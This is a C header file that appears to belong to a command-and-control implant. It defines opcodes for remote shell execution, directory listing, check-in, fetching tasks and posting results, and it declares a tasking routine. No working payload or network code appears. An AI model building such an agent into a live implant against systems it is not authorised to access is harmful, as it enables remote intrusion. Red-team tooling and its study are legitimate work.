#pragma once

#ifndef COMMAND
#define COMMAND

#include "ceos.h"
#include "Parser.h"
#include "Package.h"
#include "Shell.h"
#include "Dir.h"


#define EXIT_CMD 0x10
#define EXIT_THREAD_CMD 0x11
#define SHELL_CMD 0x54
#define DIR_CMD 0x55
#define GET_TASKING 0x00
#define POST_RESPONSE 0x01
#define CHECKIN 0xf1


BOOL routine();
BOOL parseCheckin(PParser ResponseParser);



#endif
